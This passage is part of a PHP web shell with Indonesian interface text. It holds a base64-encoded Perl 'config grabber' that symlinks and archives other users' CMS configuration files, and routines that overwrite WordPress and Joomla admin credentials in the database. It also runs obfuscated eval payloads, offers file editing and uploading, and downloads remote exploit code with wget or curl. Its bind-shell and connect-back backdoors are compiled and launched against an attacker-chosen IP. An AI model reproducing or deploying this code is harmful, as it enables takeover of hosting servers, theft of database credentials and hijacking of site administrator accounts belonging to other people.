tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gbmV3cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSBqb29tbGEgLSBuZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictIGpvb21sYSAtIGhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictIHZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy0gdmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1wYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictemVuY2FydC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLSB6ZW5jYXJ0IC0gc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLXNob3AtWkNzaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywka29sYS4nLSBzbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywka29sYS4nLSBzbWYgLSBzbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRrb2xhLictIHNtZiAtIGZvcnVtLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGtvbGEuJy0gc21mIC0gZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictIHVwbG9hZCAudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGtvbGEuJy0gbWFsYXkudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGtvbGEuJy0gbG9rb21lZGlhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGtvbGEuJy0gbG9rb21lZGlhLnR4dCcpOyANCiB9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPiZuYnNwOzwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9IndpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MDBweCI+PC90ZXh0YXJlYT4NCjxiciAvPjxiciAvPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAyMTJweCIgLz48YnIgLz48YnIgLz4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJIYWphciAuLiEiIHN0eWxlPSJ3aWR0aDogOTlweCIgLz4NCjxiciAvPg0KPC9mb3JtPic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPkRvbmUgISE8L3A+DQo8cD4mbmJzcDs8L3A+JzsNCmlmKCRGT1JNe3Rhcn0gbmUgIiIpew0Kb3BlbihJTkZPLCAidGFyLnRtcCIpOw0KQGxpbmVzID08SU5GTz4gOw0KY2xvc2UoSU5GTyk7DQpzeXN0ZW0oQGxpbmVzKTsNCnByaW50JzxwPjxhIGhyZWY9IicuJEZPUk17dGFyfS4nLnRhciI+IGRvd25sb2FkICBmaWxlPC9hPjwvcD4nOw0KfQ0KfQ0KIHByaW50Ig0KPC9ib2R5Pg0KPC9odG1sPiI7';
    $file = fopen("config.izo", "w+");
    $write = fwrite($file, base64_decode($configshell));
    fclose($file);
    chmod("config.izo", 0755);
    echo "&lt;iframe src=config/config.izo width=97% height=100% frameborder=0&gt;&lt;/iframe&gt;
   &lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'wp')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[  WordPress Mysql Admin Shell ]==--+&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
    if (empty($_POST['pwd'])) {
        echo "&lt;FORM method='POST'&gt;
&lt;table class='tabnet' style='width:300px;'&gt; &lt;tr&gt;&lt;th colspan='2'&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;
&lt;input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Database&lt;/td&gt;&lt;td&gt;
&lt;input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;username&lt;/td&gt;&lt;td&gt;
&lt;input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;password&lt;/td&gt;&lt;td&gt;
&lt;input style='width:220px;' class='inputz' type='text' name='password' value='**' /&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;User baru&lt;/td&gt;&lt;td&gt;
&lt;input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Pass Baru&lt;/td&gt;&lt;td&gt;
&lt;input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' /&gt;&nbsp;

&lt;input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /&gt;&lt;/FORM&gt;
&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
";
    } else {
        $localhost = $_POST['localhost'];
        $database = $_POST['database'];
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pwd = $_POST['pwd'];
        $admin = $_POST['admin'];
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        $hash = crypt($pwd);
        $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 1") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 1") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 2") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 2") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 3") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 3") or die(mysql_error());
        $a4s = @mysql_query("UPDATE wp_users SET user_email ='" . $SQL . "' WHERE ID = 1") or die(mysql_error());
        if ($a4s) {
            echo "&lt;b&gt; Success ..!! :)) sekarang bisa login ke wp-admin&lt;/b&gt; ";
        }
    }
    echo "
   &lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'joomla')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;+--==[  Joomla Mysql Admin Shell ]==--+&lt;/font&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
    if (empty($_POST['pwd'])) {
        echo "&lt;FORM method='POST'&gt;&lt;table class='tabnet' style='width:300px;'&gt; &lt;tr&gt;&lt;th colspan='2'&gt;Connect to mySQL &lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;
&lt;input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Database&lt;/td&gt;&lt;td&gt;
&lt;input style='width:270px;' class='inputz' type='text' name='database' value='database' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;username&lt;/td&gt;&lt;td&gt;
&lt;input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;password&lt;/td&gt;&lt;td&gt;
&lt;input style='width:270px;' class='inputz' type='password' name='password' value='**' /&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;User baru&lt;/td&gt;&lt;td&gt;
&lt;input style='width:270px;' class='inputz' name='admin' value='admin' /&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;pass baru &lt;/td&gt;&lt;td&gt;123456 = 
&lt;input style='width:130px;' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' /&gt;&nbsp;

&lt;input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /&gt;&lt;/FORM&gt;
&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
";
    } else {
        $localhost = $_POST['localhost'];
        $database = $_POST['database'];
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pwd = $_POST['pwd'];
        $admin = $_POST['admin'];
        @mysql_connect($localhost, $username, $password) or die(mysql_error());
        @mysql_select_db($database) or die(mysql_error());
        $hash = crypt($pwd);
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 62") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 62") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 63") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 63") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 64") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 64") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET username ='" . $admin . "' WHERE ID = 65") or die(mysql_error());
        $SQL = @mysql_query("UPDATE jos_users SET password ='" . $pwd . "' WHERE ID = 65") or die(mysql_error());
        if ($SQL) {
            echo "&lt;b&gt;Success : skarang password barunya &gt;&gt;&gt; - (123456)";
        }
    }
    echo "
   &lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'jumping')) {
    eval(gzinflate(base64_decode($jumper)));
    "&lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'domain')) {
    eval(gzinflate(base64_decode($domain)));
    "&lt;/div&gt;";
} elseif (isset($_GET['view']) && ($_GET['view'] != "")) {
    if (is_file($_GET['view'])) {
        if (!isset($file)) $file = magicboom($_GET['view']);
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
        } else {
            $owner = $user;
        }
        $filn = basename($file);
        echo "&lt;table style=\"margin:6px 0 0 2px;line-height:20px;\"&gt; &lt;tr&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td&gt;&lt;span id=\"" . clearspace($filn) . "_link\"&gt;" . $file . "&lt;/span&gt; &lt;form action=\"?y=" . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $filn . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $filn . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;&lt;td&gt;" . ukuran($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Permission&lt;/td&gt;&lt;td&gt;" . get_perms($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Owner&lt;/td&gt;&lt;td&gt;" . $owner . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Create time&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filectime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last modified&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filemtime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last accessed&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @fileatime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Actions&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$file\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$file\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$file\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$file\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;View&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "\"&gt;text&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\"&gt;code&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=image\"&gt;image&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; ";
        if (isset($_GET['type']) && ($_GET['type'] == 'image')) {
            echo "&lt;div style=\"text-align:center;margin:8px;\"&gt;&lt;img src=\"?y=" . $pwd . "&amp;img=" . $filn . "\"&gt;&lt;/div&gt;";
        } elseif (isset($_GET['type']) && ($_GET['type'] == 'code')) {
            echo "&lt;div class=\"viewfile\"&gt;";
            $file = wordwrap(@file_get_contents($file), "240", "
");
            @highlight_string($file);
            echo "&lt;/div&gt;";
        } else {
            echo "&lt;div class=\"viewfile\"&gt;";
            echo nl2br(htmlentities((@file_get_contents($file))));
            echo "&lt;/div&gt;";
        }
    } elseif (is_dir($_GET['view'])) {
        echo showdir($pwd, $prompt);
    }
} elseif (isset($_GET['edit']) && ($_GET['edit'] != "")) {
    if (isset($_POST['save'])) {
        $file = $_POST['saveas'];
        $content = magicboom($_POST['content']);
        if ($filez = @fopen($file, "w")) {
            $time = date("d-M-Y H:i", time());
            if (@fwrite($filez, $content)) $msg = "file saved &lt;span class=\"gaya\"&gt;@&lt;/span&gt; " . $time;
            else $msg = "failed to save";
            @fclose($filez);
        } else $msg = "permission denied";
    }
    if (!isset($file)) $file = $_GET['edit'];
    if ($filez = @fopen($file, "r")) {
        $content = "";
        while (!feof($filez)) {
            $content.= htmlentities(str_replace("''", "'", fgets($filez)));
        }
        @fclose($filez);
    } ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&edit=&lt;?php echo $file; ?&gt;" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" name="content"&gt; &lt;?php echo $content; ?&gt; &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;Save as &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="&lt;?php echo $file; ?&gt;" /&gt;&lt;input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /&gt; &nbsp;&lt;?php echo $msg; ?&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'upload')) {
    if (isset($_POST['uploadcomp'])) {
        if (is_uploaded_file($_FILES['file']['tmp_name'])) {
            $path = magicboom($_POST['path']);
            $fname = $_FILES['file']['name'];
            $tmp_name = $_FILES['file']['tmp_name'];
            $pindah = $path . $fname;
            $stat = @move_uploaded_file($tmp_name, $pindah);
            if ($stat) {
                $msg = "file uploaded to $pindah";
            } else $msg = "failed to upload $fname";
        } else $msg = "failed to upload $fname";
    } elseif (isset($_POST['uploadurl'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $path = magicboom($_POST['path']);
        $namafile = download($pilihan, $wurl);
        $pindah = $path . $namafile;
        if (is_file($pindah)) {
            $msg = "file uploaded to $pindah";
        } else $msg = "failed to upload $namafile";
    } ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&x=upload" enctype="multipart/form-data" method="post"&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from computer&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;p style="text-align:center;"&gt;&lt;input style="color:#000000;" type="file" name="file" /&gt;&lt;input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"&gt;&lt;/p&gt;&lt;/td&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="&lt;?php echo $pwd; ?&gt;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from url&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;form method="post" style="margin:0;padding:0;" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=upload"&gt; &lt;table&gt;&lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="&lt;?php echo $pwd; ?&gt;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;&lt;?php echo $msg; ?&gt;&lt;/div&gt; 
  
  &lt;?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'netsploit')) {
    if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
        $port = trim($_POST['port']);
        $passwrd = trim($_POST['bind_pass']);
        tulis("bdc.c", $port_bind_bd_c);
        exe("gcc -o bdc bdc.c");
        exe("chmod 777 bdc");
        @unlink("bdc.c");
        exe("./bdc " . $port . " " . $passwrd . " &");
        $scan = exe("ps aux");
        if (eregi("./bdc $por", $scan)) {
            $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
        } else {
            $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
        }
    } elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
        $port = trim($_POST['port']);
        $passwrd = trim($_POST['bind_pass']);
        tulis("bdp", $port_bind_bd_pl);
        exe("chmod 777 bdp");
        $p2 = which("perl");
        exe($p2 . " bdp " . $port . " &");
        $scan = exe("ps aux");
        if (eregi("$p2 bdp $port", $scan)) {
            $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
        } else {
            $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
        }
    } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
        $ip = trim($_POST['ip']);
        $port = trim($_POST['backport']);
        tulis("bcc.c", $back_connect_c);
        exe("gcc -o bcc bcc.c");
        exe("chmod 777 bcc");
        @unlink("bcc.c");
        exe("./bcc " . $ip . " " . $port . " &");
        $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
    } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
        $ip = trim($_POST['ip']);
        $port = trim($_POST['backport']);
        tulis("bcp", $back_connect);
        exe("chmod +x bcp");
        $p2 = which("perl");
        exe($p2 . " bcp " . $ip . " " . $port . " &");
        $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
    } elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $namafile = download($pilihan, $wurl);
        if (is_file($namafile)) {
            $msg = exe($wcmd);
        } else $msg = "error: file not found $namafile";
    } ?&gt; &lt;table class="tabnet"&gt; &lt;tr&gt;&lt;th&gt;Port Binding&lt;/th&gt;&lt;th&gt;Connect Back&lt;/th&gt;&lt;th&gt;Load and Exploit&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="port" size="26" value="&lt;?php echo $bindport ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="bind_pass" size="26" value="&lt;?php echo $bindport_pass; ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select class="inputz" size="1" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="ip" size="26" value="&lt;?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="backport" size="26" value="&lt;?php echo $bindport; ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select size="1" class="inputz" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; 